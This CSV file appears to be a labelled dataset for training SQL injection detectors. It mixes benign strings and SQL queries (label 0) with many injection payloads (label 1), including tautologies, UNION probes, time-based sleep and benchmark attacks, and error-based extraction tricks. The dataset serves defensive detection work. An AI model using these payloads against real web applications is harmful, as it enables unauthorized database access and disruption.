Query,Label
rob,0
sant carles de la rpita,0
9491,0
SELECT COUNT ( tears ) FROM might,0
"Pawnbrokers shine Singapore middle class feel pinch At pawnshop Bendemeer shopping centre Singapore , Janani Amirthalinga swapping gold bangle , ring pair earrings pay daughters &quot; school fees",0
"SELECT Customers.CustomerName, Orders.OrderID FROM Customers LEFT JOIN Orders ON Customers.CustomerID  =  Orders.CustomerID ORDER BY Customers.CustomerName;",0
"Chief executive officer Phillip Hare asked one case YMCA employee charged child pornography offences , another gym instructor YMCA Caringbah Hall convicted child sexual offences children care 1991",0
06145837f,0
1' )  where 6305 = 6305 rlike  ( select  ( case when  ( 8326 = 9749 )  then 1 else 0x28 end  )  )  --,1
hotson,0
d060u2ar,0
"SELECT * FROM well ORDER BY pile ASC, child DESC",0
SELECT MIN ( air )  AS refer FROM refused,0
"SELECT stage, asleep+ ', ' + spent+ ' ' + secret+ ', ' + continued AS during  FROM rise",0
SELECT wherever ( s ) FROM degree INNER JOIN,0
ralf,0
ferris,0
.lapidosa,0
solania,0
"1%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""%""  =  """,1
0644186942198058,0
bebedizo,0
select   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  select 3140 from master..sysdatabases  )   end  )  --,1
"select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1
SELECT AVG ( for ) FROM ordinary,0
94lp90ulo,0
cassius,0
seurat1@sitcpla.ma,0
SELECT COUNT ( memory ) FROM organization,0
padiernos,0
"SELECT Orders.relationshiprID, Employees.press, Employees.natural FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planningID ORDER BY Orders.dogID",0
2993,0
"SELECT FIND_IN_SET ( ""q"", null ) ;",0
"josep guix i llado, 89 2-d",0
amadeo,0
"Good bad names readily transferable this; right constitution, wrong it",0
SELECT * FROM beside WHERE wise = 'frog'  AND City = 'sets',0
1'   )    )    as cwss where 9720  =  9720,1
verney,0
"SELECT anybody, rough+ ', ' + wide+ ' ' + laid+ ', ' + folks AS yet  FROM clay",0
"1"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"-5891 )  where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",1
zigoitia,0
1'||  (  select 'rjun' where 8868  =  8868 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1
SELECT * FROM willing FETCH FIRST 3 ROWS ONLY,0
"1""  )   where 3122  =  3122 and sleep  (  5  )  #",1
sanchopancesco,0
"1%' union all select null,null,null,null,null,null,null#",1
"1""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
brutez,0
' or 'unusual'  =  'unusual',1
"SELECT * FROM baseball WHERE elephant BETWEEN ""suppose"" AND    ""gas""",0
"1 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1
primera 152 11-g,0
78977050h,0
1' in boolean mode )  and 5725 = 5552#,1
1860000000000000,0
-3125'   )    )     )   order by 1#,1
SELECT TOP 3 * FROM organized,0
SELECT * FROM suit 3 SELECT * FROM blue,0
del nuevo mundo s/n,0
1677,0
edi,0
"1'  )  )   or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null  )  )  ||'",1
cadrete,0
-7950' )  or 9323 = 9323#,1
aflechate,0
cecil.wolcott7@librodeapuntes.sv,0
2435495115803768,0
SELECT facing FROM when,0
cukera,0
"In B Class , two teams Baiersbronn Freudenstadt faced Murgtalhalle Baiersbronn",0
1  )  )   as jvoo where 5116 = 5116 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
$ 325m rescue package Tassie health The Federal Government insists $ 325 million rescue package Tasmania &apos;s ailing health system tough conditions attached ensure State Government &apos;t waste funds,0
1'  )  )   order by 1#,1
SELECT * FROM production FETCH FIRST 50 PERCENT ROWS ONLY,0
01193,0
86651591b,0
igualeja,0
DELETE FROM label,0
"As festival expanded , world comedy",0
21302211w,0
"-5513""  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( ""ovmk"" like ""ovmk",1
SELECT * FROM fellow  WHERE for NOT LIKE '[steam]%',0
96639593x,0
1' )  as xqbq where 1619 = 1619 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
"1"" )  where 4878 = 4878 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --",1
1,1
jung5,0
6079560291532789,0
72588514p,0
genee@dissident.sj,0
char%4039%41%2b%40SELECT,1
-2504'   )    )     )   or 8723  =  9715,1
"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1%'  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  '%' = '",1
